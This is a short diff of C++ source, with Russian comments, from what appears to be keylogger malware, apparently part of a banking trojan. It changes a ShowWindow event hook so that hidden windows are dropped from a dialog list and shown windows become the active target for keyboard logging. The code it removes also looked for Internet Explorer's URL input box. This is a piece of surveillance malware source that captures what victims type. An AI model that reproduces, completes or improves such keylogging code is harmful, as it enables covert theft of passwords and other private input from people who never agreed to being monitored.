@@ -3039,23 +3039,37 @@ void KeyLogger::DoShowWindow(PShowWindowData Data)
 }
 
 
+bool inline __IsShowWndCommand(DWORD C)
+{
+	// Функция возвращает истину если команда Cmd является
+	// Командой отображения окна
+	return C == SW_SHOWNORMAL ||
+		   C == SW_SHOWMAXIMIZED ||
+		   C == SW_SHOW;
+}
+
 void KeyLogger::DoAfterShowWindow(PShowWindowData Data)
 {
 	// Событие после функции показа окна
-	if (Data->Command == SW_SHOW)
+	PKeyLogger L = GetLogger(true);
+	if (L != NULL)
 	{
-    	// Устанавливаем активное окно
-		KeyLogger::SetActiveWnd(Data->Window, LOG_KEYBOARD);
-
-		PKeyLogger L = GetLogger(false);
-
-		// Ищем окно ввода URL в ИЕ
-		if (L != NULL && L->Process == PROCESS_IE && KLG.UrlEditWnd == NULL)
+		if (Data->Command == SW_HIDE)
+		{
+			// Прячется окно, удаляем его из списка активных диалогов
+			List::Remove(KLG.Dialogs, Data->Window);
+		}
+		else
+		if (__IsShowWndCommand(Data->Command))
 		{
 
+			// Устанавливаем активное окно
+			PCHAR  Txt = GetWndText(Data->Window);
+			KeyLogger::SetActiveWnd(Data->Window, LOG_KEYBOARD);
+			STR::Free(Txt);
 
-        }
-	}
+		}
+    }
 
 	CallEvent(KLE_AFTER_SHOW_WND, Data);
 }
